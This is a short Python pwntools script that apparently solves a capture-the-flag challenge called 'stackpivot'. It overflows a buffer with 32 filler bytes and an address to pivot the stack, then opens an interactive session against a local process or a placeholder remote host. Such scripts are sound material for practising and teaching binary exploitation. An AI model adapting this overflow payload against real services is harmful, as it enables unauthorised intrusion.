#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 0000
HOST = "000000000"
exe = context.binary = ELF('./stackpivot', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

p.sendline(b'1')
payload = b'a'*32 + p64(0x404850 - 8)

p.sendafter(b'> ',payload)
p.sendafter(b'> ', b'3')

p.interactive()